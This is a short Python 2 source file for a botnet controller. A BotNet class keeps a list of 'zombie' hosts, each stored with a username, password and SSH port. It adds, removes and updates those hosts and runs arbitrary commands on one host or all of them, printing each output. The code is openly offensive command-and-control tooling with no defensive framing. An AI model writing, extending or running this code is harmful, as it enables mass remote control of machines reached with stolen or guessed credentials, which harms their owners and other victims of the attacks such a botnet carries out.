from Zombie import *
from socket import gethostbyname

class BotNet:
	def __init__(self):
		self.botNet = []
		
	def execCommand(self, command, host):
		if host != 'ALL':
			try:
				host = gethostbyname(host)
			except:
				return 2 # host not well defined
		found = 1 # host not found
		for zombie in self.botNet:
			if host != 'ALL' and zombie.host == host:
				output = zombie.send_command(command)
				print '[*] Output from ' + zombie.host
				print '[+] ' + output + '\n'
				return 0 # host found
			if host == 'ALL':
				output = zombie.send_command(command)
				print '[*] Output from ' + zombie.host
				print '[+] ' + output + '\n'
				found = 0 # host found
		return found # host found or not
				
	def addZombie(self, host, user, password, port=22, pwdAuth='yes'):
		host = gethostbyname(host)
		for zombie in self.getZombies():
			if zombie.host == host:
				return 1 # host already exists
		zombie = Zombie(host, user, password, port, pwdAuth)
		self.botNet.append(zombie)
		return 0 # everything went fine
		
	def delZombie(self, host):
		host = gethostbyname(host)
		for z in self.getZombies():
			if z.host == host:
				self.botNet.remove(z)
				return 0 # delete done
		return 1 # did not find it
	
	def updateZombie(self, host, user, password, port=22, pwdAuth='yes'):
		host = gethostbyname(host)
		for z in self.getZombies():
			if z.host == host:
				z.user = user
				z.password = password
				z.port = port
				z.pwdAuth = pwdAuth
				return 0 # update done
		return 1 # did not find it
				
	def getZombies(self):
		return self.botNet
